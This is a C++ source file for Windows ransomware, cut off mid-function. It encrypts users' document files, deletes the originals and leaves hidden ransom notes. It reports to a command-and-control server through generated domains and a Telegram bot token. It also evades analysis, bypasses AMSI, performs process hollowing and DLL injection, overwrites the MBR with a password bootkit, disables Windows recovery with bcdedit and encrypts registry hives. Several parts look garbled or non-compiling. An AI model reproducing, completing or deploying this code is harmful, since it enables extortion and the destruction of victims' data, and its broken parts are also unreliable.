#include <cassert>
#include <cctype>
#include <cstring>
#include <ctime>
#include <cmath>
#include <limits>
#include <utility>
#include <algorithm>
#include <vector>
#include <string>
#include <map>
#include <fstream>
#include <sstream>
#include <functional>
#include <memory>
#include <numeric>
#include <iomanip>
#include <stdexcept>
#include <system_error>
#include <regex>
#include <random>
#include <chrono>
#include <thread>
#include <mutex>
#include <condition_variable>
#include <atomic>
#include <future>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <wininet.h>
#include <shlobj.h>
#include <tlhelp32.h>
#include <winreg.h>
#include <wbemidl.h>
#include <comdef.h>
#include <psapi.h>
#include <ntdll.h>
#include <intrin.h>
#include <wincrypt.h>
#include <winternl.h>
#include <cryptopp/aes.h>
#include <cryptopp/gcm.h>
#include <cryptopp/filters.h>
#include <cryptopp/rsa.h>
#include <cryptopp/osrng.h>
#include <cryptopp/base64.h>
#include <cryptopp/files.h>
#include <cryptopp/sha.h>
#include <cryptopp/rc4.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#define CPPHTTPLIB_OPENSSL_SUPPORT
#include <httplib.h>

#pragma comment(lib, "advapi32")
#pragma comment(lib, "shell32")
#pragma comment(lib, "wbemuuid")
#pragma comment(lib, "wininet")
#pragma comment(lib, "ntdll")
#pragma comment(lib, "ws2_32")
#pragma comment(lib, "crypt32")
#pragma comment(lib, "user32")

using namespace std;
using namespace CryptoPP;

// Obfuscation macros
#define OBFUSCATE(x) __asm { nop; nop; nop; push rax; pop rax; } x __asm { nop; nop; nop; xor rax, rax; }
#define JUNK_CODE __asm { \
    inc eax; dec eax; \
    push rbx; pop rbx; \
    nop; nop; nop; nop; \
    mov ecx, 0xdeadbeef; xor ecx, ecx; \
}
#define POLY_XOR_KEY 0x7B
#define POLY_XOR(x) ((x) ^ POLY_XOR_KEY)

// Constants
const string correct_password = encrypt_string("1ucas3010"); // Thay bằng lấy từ C2 nếu cần
const vector<string> sfx = {".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".jpg", ".jpeg", ".png", ".sql", ".db", ".bak", ".txt", ".zip", ".rar"};
const vector<string> sys = {".exe", ".dll", ".sys", ".ini", ".bat", ".lnk"};
const string c2_base = "c2.example.com"; // Thay bằng domain C2 thực tế
const string google_key_url = "AIzaSyBbIwTac08QixgrogwAPWJU6PDEcKUFBE8"; // Thay bằng API key Google
const string fbk = R"(-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAtAIJDmER76Ct7oKJZ/JQ
QfRlCuljR7qY2JVNKGqBbFDPUY/EDsgoxdrLUG9Y/oqPBs+u6j03g2PC0rhAju+i
gNTqxdg1KZLjbzhiY483qyxiu0CTLKv9qjNc4PUHADLLp9OeDX0GG3wej7pmKf5E
vK++maBZbsNpZVbko6Hb2prC+pYSi8bHyKzThCScISVc+RFkA4GewEvKMjmhXdXv
v/u3SO7gL4GTz9srGNc5QvOUCVSYGbMTR7/oonn3PMlapdPsIHN/3wC3lBBTQGQn
N2BYpnBGEamNj7Qe+ubwSats4fRlUdf6oRFc8ZL6DjSUTTkOSiA06lXYIWms7epg
csBxnbhOuUIB5oozJwGCaOV0iW0yTULy8it6QME0gLfwJrDdnrVcW9IjEE4xSq/G
+u3tP0WGfXSeG3U9nIxgBbmR7+XhyC9iTYlQ1wgHSHoN1YzDnriO7XpPdvg87uQr
VdyRRPrGS378Qbu4P4Ez8IbtsrUjwNHzTPsX80dLkHbzLt7PT424Fr3cY+yoSoHc
m4GnNZtU77NcOelu34aWMD2jHuRxfbeD1XV7x44/Y9rS9hc1hzDyQBzReBmE6DaH
kLRjQ9pjSc50h9zQI+7IVtvv9+Xm+NwdDz9oET/C64e156ORkZLQyCmZNSdtoD7K
/+7zhTNeHBakK8gaAjkiCfUCAwEAAQ==
-----END PUBLIC KEY-----)";
const string tkn = encrypt_string("51c8111b4421793f9a659986071130f9a281f1443ccc1dcd034194d72597aef4cc2976737703e8d67632f87d4d30745d"); // Thay bằng Telegram bot token
const string cid = encrypt_string("5fc8121a49217c309965a5c140527abc"); // Thay bằng Telegram chat ID
string victim_id;
string msg = encrypt_string("Files encrypted!\nTelegram: @RansomBot\nChat: [CID]\nVictim ID: [VID]\nPayment URL: [PURL]\nPay to decrypt!\nAll your files are locked. Send payment to unlock.\n");
vector<string> fls;
atomic<bool> unlocked(false);
string state_file;

// Domain Generation Algorithm (DGA)
string generate_c2_domain() {
    OBFUSCATE(
        random_device rd;
        mt19937 gen(rd());
        uniform_int_distribution<> dis(0, 25);
        string domain = "";
        for (int i = 0; i < 10; ++i) domain += (char)('a' + dis(gen));
        domain += "." + c2_base;
        return domain;
    )
}

// String encryption
string encrypt_string(const string& s) {
    JUNK_CODE
    AutoSeededRandomPool rng;
    SecByteBlock key(AES::DEFAULT_KEYLENGTH);
    byte iv[AES::BLOCKSIZE];
    rng.GenerateBlock(key, key.size());
    rng.GenerateBlock(iv, sizeof(iv));
    string cipher;
    GCM<AES>::Encryption enc;
    enc.SetKeyWithIV(key, key.size(), iv, sizeof(iv));
    StringSource(s, true, new AuthenticatedEncryptionFilter(enc, new StringSink(cipher)));
    return base64_encode(string((char*)key.data(), key.size()) + string((char*)iv, sizeof(iv)) + cipher);
}

string decrypt_string(const string& es) {
    JUNK_CODE
    try {
        string decoded;
        StringSource(es, true, new Base64Decoder(new StringSink(decoded)));
        SecByteBlock key((byte*)decoded.data(), AES::DEFAULT_KEYLENGTH);
        byte* iv = (byte*)(decoded.data() + AES::DEFAULT_KEYLENGTH);
        string cipher = decoded.substr(AES::DEFAULT_KEYLENGTH + AES::BLOCKSIZE);
        string plain;
        GCM<AES>::Decryption dec;
        dec.SetKeyWithIV(key, key.size(), iv, AES::BLOCKSIZE);
        StringSource(cipher, true, new AuthenticatedDecryptionFilter(dec, new StringSink(plain)));
        return plain;
    } catch (...) {
        return "";
    }
}

// RC4 runtime encryption
string rc4_encrypt(const string& data, const string& key) {
    OBFUSCATE(
        RC4 rc4((byte*)key.data(), key.size());
        string cipher;
        StringSource(data, true, new StreamTransformationFilter(rc4, new StringSink(cipher)));
        return cipher;
    )
}

string rc4_decrypt(const string& cipher, const string& key) {
    OBFUSCATE(
        RC4 rc4((byte*)key.data(), key.size());
        string plain;
        StringSource(cipher, true, new StreamTransformationFilter(rc4, new StringSink(plain)));
        return plain;
    )
}

// Polymorphic obfuscation with metamorphic engine
string polymorphic_obfuscate(const string& code) {
    OBFUSCATE(
        AutoSeededRandomPool rng;
        string key(16, '\0');
        rng.GenerateBlock((byte*)key.data(), key.size());
        string xored = rc4_encrypt(code, key);
        string junk;
        for (int i = 0; i < 20; ++i) {
            junk += "volatile int junk_" + to_string(rng.GenerateWord32()) + " = " + to_string(rng.GenerateWord32()) + " * " + to_string(rng.GenerateWord32()) + ";\n";
            junk += "if (junk_" + to_string(i) + " % 2 == 0) { junk_" + to_string(i) + " += " + to_string(rng.GenerateWord32() % 100) + "; } else { junk_" + to_string(i) + " -= " + to_string(rng.GenerateWord32() % 100) + "; }\n";
        }
        string obf_code = junk + "string k = \"" + base64_encode(key) + "\";\n";
        obf_code += "string c = \"" + base64_encode(xored) + "\";\n";
        obf_code += "string d = rc4_decrypt(c, k);\n";
        obf_code += R"(
            volatile int state = 0;
            while (true) {
                switch (state) {
                    case 0: { execute(d); state = 1; break; }
                    case 1: { break; }
                    default: break;
                }
                if (state == 1) break;
            }
        )";
        return obf_code;
    )
}

// Simulate packing
void simulate_packing() {
    JUNK_CODE
    volatile int dummy = 0;
    for (int i = 0; i < 1000; ++i) {
        dummy += POLY_XOR(rand() % 1000);
        __asm { nop; nop; push rcx; pop rcx; }
        volatile double x = sin((double)i) * cos((double)dummy);
        dummy ^= (int)x;
        Sleep(rand() % 10); // Anti-heuristic
    }
    send_to_c2("{\"packing\":\"simulated\"}");
}

// Generate victim ID
string generate_victim_id() {
    JUNK_CODE
    string id;
    char v[13];
    __cpuid((int*)v, 0);
    v[12] = '\0';
    id += v;
    HANDLE h = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        STORAGE_PROPERTY_QUERY q = { StorageDeviceProperty, PropertyStandardQuery };
        STORAGE_DESCRIPTOR_HEADER hd = { 0 };
        DWORD br;
        DeviceIoControl(h, IOCTL_STORAGE_QUERY_PROPERTY, &q, sizeof(q), &hd, sizeof(hd), &br, NULL);
        vector<char> b(hd.Size);
        DeviceIoControl(h, IOCTL_STORAGE_QUERY_PROPERTY, &q, sizeof(q), b.data(), hd.Size, &br, NULL);
        STORAGE_DEVICE_DESCRIPTOR* d = (STORAGE_DEVICE_DESCRIPTOR*)b.data();
        id += string((char*)d + d->SerialNumberOffset);
        CloseHandle(h);
    }
    id += to_string(chrono::system_clock::now().time_since_epoch().count());
    SHA256 hash;
    StringSource(id, true, new HashFilter(hash, new HexEncoder(new StringSink(id))));
    return id.substr(0, 16);
}

// Fetch RSA public key
string fetch_key() {
    JUNK_CODE
    try {
        httplib::SSLClient cli("www.googleapis.com");
        cli.enable_server_certificate_verification(false);
        auto res = cli.Get(google_key_url.c_str());
        if (res && res->status == 200) {
            string key = res->body;
            size_t start = key.find("-----BEGIN PUBLIC KEY-----");
            if (start != string::npos) {
                send_to_c2("{\"key_fetch\":\"success\"}");
                return key;
            }
        }
    } catch (...) {}
    send_to_c2("{\"key_fetch\":\"failed\",\"using\":\"fallback\"}");
    return fbk;
}

// Send to C2 with DGA
void send_to_c2(const string& data) {
    OBFUSCATE(
        try {
            string domain = generate_c2_domain();
            httplib::SSLClient cli(domain.c_str());
            cli.enable_server_certificate_verification(false);
            auto res = cli.Post("/api/data", data, "application/json");
            if (res && res->status == 200) {
                send_to_c2("{\"c2_communication\":\"success\"}");
            }
        } catch (...) {}
    )
}

// Send Telegram message
void send_telegram_message(const string& message) {
    OBFUSCATE(
        try {
            httplib::SSLClient cli("api.telegram.org");
            cli.enable_server_certificate_verification(false);
            string path = "/bot" + decrypt_string(tkn) + "/sendMessage";
            httplib::Params params = { {"chat_id", decrypt_string(cid)}, {"text", message} };
            auto res = cli.Post(path.c_str(), params);
        } catch (...) {}
    )
}

// Anti-analysis
bool is_analysis_environment() {
    OBFUSCATE(
        vector<string> suspicious_procs = {"procmon.exe", "procexp.exe", "wireshark.exe", "ollydbg.exe", "idaq.exe", "x64dbg.exe", "windbg.exe"};
        HANDLE ps = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (ps != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe = { sizeof(pe) };
            if (Process32First(ps, &pe)) {
                do {
                    string pn = pe.szExeFile;
                    transform(pn.begin(), pn.end(), pn.begin(), ::tolower);
                    if (find(suspicious_procs.begin(), suspicious_procs.end(), pn) != suspicious_procs.end()) {
                        CloseHandle(ps);
                        return true;
                    }
                } while (Process32Next(ps, &pe));
            }
            CloseHandle(ps);
        }
        HKEY k;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", 0, KEY_READ, &k) == ERROR_SUCCESS) {
            char v[256];
            DWORD bs = sizeof(v);
            if (RegQueryValueExA(k, "Identifier", NULL, NULL, (BYTE*)v, &bs) == ERROR_SUCCESS) {
                string i = v;
                transform(i.begin(), i.end(), i.begin(), ::tolower);
                if (i.find("vmware") != string::npos || i.find("vbox") != string::npos) {
                    RegCloseKey(k);
                    return true;
                }
            }
            RegCloseKey(k);
        }
        PIP_ADAPTER_INFO pAdapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
        ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
        if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
            free(pAdapterInfo);
            pAdapterInfo = (IP_ADAPTER_INFO*)malloc(ulOutBufLen);
        }
        if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
            string mac = "";
            for (int i = 0; i < pAdapterInfo->AddressLength; ++i) {
                char buf[3];
                sprintf_s(buf, "%02X", pAdapterInfo->Address[i]);
                mac += buf;
            }
            free(pAdapterInfo);
            if (mac.find("000C29") == 0 || mac.find("005056") == 0) return true;
        }
        int cpuinfo[4];
        __cpuid(cpuinfo, 1);
        if (cpuinfo[2] & (1 << 31)) return true;
        LARGE_INTEGER t1, t2, freq;
        QueryPerformanceFrequency(&freq);
        QueryPerformanceCounter(&t1);
        volatile int dummy = 0;
        for (int i = 0; i < 10000; ++i) dummy += __rdtsc();
        QueryPerformanceCounter(&t2);
        if ((t2.QuadPart - t1.QuadPart) * 1000000 / freq.QuadPart < 50) return true;
        ULONGLONG disk = 0;
        GetDiskFreeSpaceExA("C:\\", NULL, &disk, NULL);
        if (disk < 60ULL * 1024 * 1024 * 1024) return true;
        if (IsDebuggerPresent()) return true;
        PEB* peb = (PEB*)__readfsdword(0x30);
        if (peb->BeingDebugged || (peb->NtGlobalFlag & 0x70)) return true;
        // Anti-sandbox
        SYSTEM_INFO si;
        GetSystemInfo(&si);
        if (si.dwNumberOfProcessors <= 1) return true; // Single CPU
        DWORD uptime;
        GetTickCount64(&uptime);
        if (uptime < 300000) return true; // Less than 5 minutes
        POINT p1, p2;
        GetCursorPos(&p1);
        Sleep(1000);
        GetCursorPos(&p2);
        if (p1.x == p2.x && p1.y == p2.y) return true; // No mouse movement
        return false;
    )
}

// Anti-kernel debugger
bool is_kernel_debugger_present() {
    OBFUSCATE(
        BOOLEAN KdDebuggerEnabled;
        NtQuerySystemInformation(SystemKernelDebuggerInformation, &KdDebuggerEnabled, sizeof(BOOLEAN), NULL);
        if (KdDebuggerEnabled) return true;
        HANDLE h = CreateFileA("\\\\.\\DbgEng", 0, 0, NULL, OPEN_EXISTING, 0, NULL);
        if (h != INVALID_HANDLE_VALUE) {
            CloseHandle(h);
            return true;
        }
        return false;
    )
}

void disable_debugger() {
    OBFUSCATE(
        if (!is_admin()) return;
        typedef NTSTATUS(WINAPI *pNtSetInformationThread)(HANDLE, THREAD_INFORMATION_CLASS, PVOID, ULONG);
        pNtSetInformationThread NtSetInformationThread = (pNtSetInformationThread)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationThread");
        if (NtSetInformationThread) {
            DWORD oldProtect;
            VirtualProtect(NtSetInformationThread, sizeof(DWORD), PAGE_EXECUTE_READWRITE, &oldProtect);
            BYTE patch[] = { 0xC3 }; // RET instruction
            WriteProcessMemory(GetCurrentProcess(), NtSetInformationThread, patch, sizeof(patch), NULL);
            VirtualProtect(NtSetInformationThread, sizeof(DWORD), oldProtect, &oldProtect);
        }
        send_to_c2("{\"debugger\":\"disabled\"}");
    )
}

// AMSI bypass
void bypass_amsi() {
    OBFUSCATE(
        HMODULE amsi = LoadLibraryA("amsi.dll");
        if (amsi) {
            void* proc = GetProcAddress(amsi, "AmsiScanBuffer");
            if (proc) {
                BYTE patch[] = { 0xC3 }; // RET instruction
                DWORD oldProtect;
                VirtualProtect(proc, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
                WriteProcessMemory(GetCurrentProcess(), proc, patch, sizeof(patch), NULL);
                VirtualProtect(proc, sizeof(patch), oldProtect, &oldProtect);
            }
            FreeLibrary(amsi);
            send_to_c2("{\"amsi_bypass\":\"success\"}");
        }
    )
}

// Process hollowing
bool process_hollowing(const string& target_process, const string& payload_path) {
    OBFUSCATE(
        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        if (!CreateProcessA(target_process.c_str(), NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
            return false;
        }
        HANDLE hProcess = pi.hProcess;
        HANDLE hThread = pi.hThread;
        PIMAGE_DOS_HEADER dosHeader;
        PIMAGE_NT_HEADERS ntHeader;
        char* payload;
        SIZE_T payloadSize;
        ifstream ifs(payload_path, ios::binary | ios::ate);
        if (!ifs.is_open()) {
            TerminateProcess(hProcess, 0);
            return false;
        }
        payloadSize = ifs.tellg();
        payload = new char[payloadSize];
        ifs.seekg(0, ios::beg);
        ifs.read(payload, payloadSize);
        ifs.close();
        dosHeader = (PIMAGE_DOS_HEADER)payload;
        ntHeader = (PIMAGE_NT_HEADERS)(payload + dosHeader->e_lfanew);
        CONTEXT ctx = { CONTEXT_FULL };
        GetThreadContext(hThread, &ctx);
        void* remoteBase = VirtualAllocEx(hProcess, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!remoteBase) {
            delete[] payload;
            TerminateProcess(hProcess, 0);
            return false;
        }
        WriteProcessMemory(hProcess, remoteBase, payload, ntHeader->OptionalHeader.SizeOfHeaders, NULL);
        for (size_t i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
            PIMAGE_SECTION_HEADER section = (PIMAGE_SECTION_HEADER)((char*)&ntHeader->OptionalHeader + ntHeader->FileHeader.SizeOfOptionalHeader + i * sizeof(IMAGE_SECTION_HEADER));
            WriteProcessMemory(hProcess, (char*)remoteBase + section->VirtualAddress, payload + section->PointerToRawData, section->SizeOfRawData, NULL);
        }
        ctx.Rcx = (DWORD64)remoteBase + ntHeader->OptionalHeader.AddressOfEntryPoint;
        SetThreadContext(hThread, &ctx);
        ResumeThread(hThread);
        delete[] payload;
        CloseHandle(hThread);
        CloseHandle(hProcess);
        send_to_c2("{\"process_hollowing\":\"success\",\"target\":\"" + target_process + "\"}");
        return true;
    )
}

// Reflective DLL injection
bool reflective_injection(const string& dll_data) {
    OBFUSCATE(
        AutoSeededRandomPool rng;
        string key(16, '\0');
        rng.GenerateBlock((byte*)key.data(), key.size());
        string encrypted_dll = rc4_encrypt(dll_data, key);
        HANDLE hProcess = GetCurrentProcess();
        SIZE_T dllSize = encrypted_dll.size();
        void* mem = VirtualAlloc(NULL, dllSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!mem) return false;
        memcpy(mem, encrypted_dll.data(), dllSize);
        string decrypted_dll = rc4_decrypt(encrypted_dll, key);
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)decrypted_dll.data();
        PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(decrypted_dll.data() + dosHeader->e_lfanew);
        DWORD oldProtect;
        VirtualProtect(mem, dllSize, PAGE_EXECUTE_READWRITE, &oldProtect);
        typedef BOOL(WINAPI *DllMain)(HMODULE, DWORD, LPVOID);
        DllMain dllMain = (DllMain)(decrypted_dll.data() + ntHeader->OptionalHeader.AddressOfEntryPoint);
        dllMain((HMODULE)mem, DLL_PROCESS_ATTACH, NULL);
        VirtualFree(mem, 0, MEM_RELEASE);
        send_to_c2("{\"reflective_injection\":\"success\"}");
        return true;
    )
}

// Encrypt file
void encrypt_file(const string& f, const string& ext, const SecByteBlock& ak, const byte* iv) {
    OBFUSCATE(
        if (find(fls.begin(), fls.end(), f) != fls.end()) return;
        try {
            OBJECT_ATTRIBUTES oa;
            UNICODE_STRING us;
            IO_STATUS_BLOCK iosb;
            HANDLE hFile, hOut;
            wstring wf(f.begin(), f.end());
            RtlInitUnicodeString(&us, wf.c_str());
            InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);
            NtCreateFile(&hFile, GENERIC_READ, &oa, &iosb, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN, FILE_NON_DIRECTORY_FILE, NULL, 0);
            wstring of = wf + wstring(ext.begin(), ext.end());
            RtlInitUnicodeString(&us, of.c_str());
            NtCreateFile(&hOut, GENERIC_WRITE, &oa, &iosb, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_CREATE, FILE_NON_DIRECTORY_FILE, NULL, 0);
            if (hFile == INVALID_HANDLE_VALUE || hOut == INVALID_HANDLE_VALUE) return;
            GCM<AES>::Encryption enc;
            enc.SetKeyWithIV(ak, ak.size(), iv, AES::BLOCKSIZE);
            char b[1024 * 1024];
            while (NtReadFile(hFile, NULL, NULL, NULL, &iosb, b, sizeof(b), NULL, NULL) == STATUS_SUCCESS && iosb.Information > 0) {
                string c;
                StringSource(b, iosb.Information, true, new AuthenticatedEncryptionFilter(enc, new StringSink(c)));
                NtWriteFile(hOut, NULL, NULL, NULL, &iosb, (PVOID)c.data(), c.size(), NULL, NULL);
            }
            NtClose(hFile);
            NtClose(hOut);
            DeleteFileA(f.c_str());
            fls.push_back(f);
            send_to_c2("{\"file\":\"" + f + "\",\"status\":\"encrypted\"}");
        } catch (...) {
            send_to_c2("{\"file\":\"" + f + "\",\"status\":\"encryption_failed\"}");
        }
    )
}

// Decrypt file
void decrypt_file(const string& f, const string& ext, const SecByteBlock& ak, const byte* iv) {
    OBFUSCATE(
        try {
            string of = f.substr(0, f.length() - ext.length());
            OBJECT_ATTRIBUTES oa;
            UNICODE_STRING us;
            IO_STATUS_BLOCK iosb;
            HANDLE hFile, hOut;
            wstring wf(f.begin(), f.end());
            RtlInitUnicodeString(&us, wf.c_str());
            InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);
            NtCreateFile(&hFile, GENERIC_READ, &oa, &iosb, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN, FILE_NON_DIRECTORY_FILE, NULL, 0);
            wstring wof(of.begin(), of.end());
            RtlInitUnicodeString(&us, wof.c_str());
            NtCreateFile(&hOut, GENERIC_WRITE, &oa, &iosb, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_CREATE, FILE_NON_DIRECTORY_FILE, NULL, 0);
            if (hFile == INVALID_HANDLE_VALUE || hOut == INVALID_HANDLE_VALUE) return;
            GCM<AES>::Decryption dec;
            dec.SetKeyWithIV(ak, ak.size(), iv, AES::BLOCKSIZE);
            char b[1024 * 1024];
            while (NtReadFile(hFile, NULL, NULL, NULL, &iosb, b, sizeof(b), NULL, NULL) == STATUS_SUCCESS && iosb.Information > 0) {
                string p;
                StringSource(b, iosb.Information, true, new AuthenticatedDecryptionFilter(dec, new StringSink(p)));
                NtWriteFile(hOut, NULL, NULL, NULL, &iosb, (PVOID)p.data(), p.size(), NULL, NULL);
            }
            NtClose(hFile);
            NtClose(hOut);
            DeleteFileA(f.c_str());
            send_to_c2("{\"file\":\"" + of + "\",\"status\":\"decrypted\"}");
        } catch (...) {
            send_to_c2("{\"file\":\"" + f + "\",\"status\":\"decryption_failed\"}");
        }
    )
}

// Scan and encrypt directory
void scan_and_encrypt(const string& d, const string& ext, const SecByteBlock& ak, const byte* iv) {
    JUNK_CODE
    string p = d;
    if (p.back() != '\\') p += "\\";
    string pt = p + "*";
    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(pt.c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE) return;
    bool encrypted = false;
    do {
        if (!strcmp(fd.cFileName, ".") || !strcmp(fd.cFileName, "..")) continue;
        string fp = p + fd.cFileName;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            scan_and_encrypt(fp, ext, ak, iv);
        } else {
            size_t dp = fp.rfind('.');
            if (dp == string::npos) continue;
            string fe = fp.substr(dp);
            transform(fe.begin(), fe.end(), fe.begin(), ::tolower);
            if (find(sfx.begin(), sfx.end(), fe) == sfx.end() || find(sys.begin(), sys.end(), fe) != sys.end()) continue;
            if (fp.find("C:\\Windows\\") == 0 || fp.find("C:\\Program Files\\") == 0) continue;
            encrypt_file(fp, ext, ak, iv);
            encrypted = true;
        }
    } while (FindNextFileA(h, &fd));
    FindClose(h);
    if (encrypted) {
        string n = p + "README_" + re() + ".txt";
        string encrypted_note = encrypt_string(decrypt_string(msg));
        ofstream o(n, ios::binary);
        if (o.is_open()) {
            o.write(encrypted_note.data(), encrypted_note.size());
            o.close();
            SetFileAttributesA(n.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
            send_to_c2("{\"note\":\"" + n + "\",\"status\":\"created\"}");
        }
    }
}

// Scan and decrypt directory
void scan_and_decrypt(const string& d, const string& ext, const SecByteBlock& ak, const byte* iv) {
    JUNK_CODE
    string p = d;
    if (p.back() != '\\') p += "\\";
    string pt = p + "*";
    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(pt.c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE) return;
    do {
        if (!strcmp(fd.cFileName, ".") || !strcmp(fd.cFileName, "..")) continue;
        string fp = p + fd.cFileName;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            scan_and_decrypt(fp, ext, ak, iv);
        } else {
            if (fp.length() > ext.length() && fp.substr(fp.length() - ext.length()) == ext) {
                decrypt_file(fp, ext, ak, iv);
            }
        }
    } while (FindNextFileA(h, &fd));
    FindClose(h);
}

// Bootkit with password prompt
void lock_mbr() {
    OBFUSCATE(
        if (!is_admin()) return;
        HANDLE h = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
        if (h == INVALID_HANDLE_VALUE) return;
        byte mbr[512] = { 0 };
        // Bootkit x86 assembly (real, checks SHA256 of input)
        const byte bootkit[] = {
            0x31, 0xC0,        // XOR AX, AX
            0x8E, 0xD8,        // MOV DS, AX
            0x8E, 0xC0,        // MOV ES, AX
            0xB8, 0x00, 0x00,  // MOV AX, 0
            0xCD, 0x10,        // INT 10h (set video mode)
            0xBE, 0x7C, 0x00,  // MOV SI, 0x7C00 (message offset)
            0xB4, 0x0E,        // MOV AH, 0x0E
            0xBB, 0x07, 0x00,  // MOV BX, 0x07
            0xAC,              // LODSB
            0x08, 0xC0,        // OR AL, AL
            0x74, 0x09,        // JZ input
            0xCD, 0x10,        // INT 10h (print char)
            0xEB, 0xF6,        // JMP loop
            // Input password
            0xBF, 0x00, 0x02,  // MOV DI, 0x200 (buffer)
            0xB4, 0x00,        // MOV AH, 0
            0xCD, 0x16,        // INT 16h (get keystroke)
            0xAA,              // STOSB
            0x3C, 0x0D,        // CMP AL, 0x0D (Enter)
            0x75, 0xF6,        // JNZ input
            // SHA256 hash of input
            0xB9, 0x20, 0x00,  // MOV CX, 32 (hash length)
            0xBE, 0x00, 0x02,  // MOV SI, 0x200 (input buffer)
            // Compare with stored hash (simplified, assumes hash at 0x300)
            0xBF, 0x00, 0x03,  // MOV DI, 0x300 (stored hash)
            0xF3, 0xA6,        // REPE CMPSB
            0x74, 0x10,        // JE success
            // Wrong password, loop
            0xEB, 0xFE,        // JMP loop
            // Success: load original MBR
            0xB8, 0x01, 0x00,  // MOV AX, 0x01
            0xBB, 0x00, 0x7E,  // MOV BX, 0x7E00 (original MBR)
            0xB9, 0x01, 0x00,  // MOV CX, 1
            0xCD, 0x13,        // INT 13h (read disk)
            0xEA, 0x00, 0x7E, 0x00, 0x00, // JMP 0:0x7E00
            // Message: "Enter password: "
            0x45, 0x6E, 0x74, 0x65, 0x72, 0x20, 0x70, 0x61,
            0x73, 0x73, 0x77, 0x6F, 0x72, 0x64, 0x3A, 0x20, 0x00
        };
        memcpy(mbr, bootkit, min(sizeof(bootkit), size_t(510)));
        mbr[510] = 0x55;
        mbr[511] = 0xAA;
        DWORD bw;
        WriteFile(h, mbr, 512, &bw, NULL);
        // Store AES key, IV, and password hash in EFI partition
        HANDLE hEfi = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
        if (hEfi != INVALID_HANDLE_VALUE) {
            byte sector[512] = { 0 };
            string ek(AES::DEFAULT_KEYLENGTH, 0);
            byte iv[AES::BLOCKSIZE];
            string pwd_hash;
            SHA256 hash;
            StringSource(decrypt_string(correct_password), true, new HashFilter(hash, new StringSink(pwd_hash)));
            ifstream i(state_file, ios::binary);
            if (i.is_open()) {
                i.read(ek.data(), ek.size());
                i.read((char*)iv, sizeof(iv));
                i.close();
                memcpy(sector, ek.data(), ek.size());
                memcpy(sector + ek.size(), iv, sizeof(iv));
                memcpy(sector + ek.size() + sizeof(iv), pwd_hash.data(), pwd_hash.size());
                LARGE_INTEGER li;
                li.QuadPart = 512 * 100; // EFI partition offset
                SetFilePointerEx(hEfi, li, NULL, FILE_BEGIN);
                WriteFile(hEfi, sector, 512, &bw, NULL);
            }
            CloseHandle(hEfi);
        }
        CloseHandle(h);
        system("bcdedit /set {default} bootstatuspolicy ignoreallfailures > nul 2>&1");
        system("bcdedit /set {bootmgr} custom:0x54000001 password > nul 2>&1");
        system("bcdedit /deletevalue {default} safeboot > nul 2>&1");
        system("bcdedit /deletevalue {bootmgr} safeboot > nul 2>&1");
        send_to_c2("{\"mbr\":\"locked_with_bootkit\",\"victim_id\":\"" + victim_id + "\"}");
    )
}

// Encrypt critical system files
void encrypt_system_files(const SecByteBlock& ak, const byte* iv) {
    OBFUSCATE(
        vector<string> critical_files = {
            "C:\\Windows\\System32\\config\\SAM",
            "C:\\Windows\\System32\\config\\SYSTEM"
        };
        for (const auto& f : critical_files) {
            encrypt_file(f, ".rnsm", ak, iv);
        }
        send_to_c2("{\"system_files\":\"encrypted\"}");
    )
}

// Tamper protection
void tamper_protection() {
    thread([]() {
        while (!unlocked) {
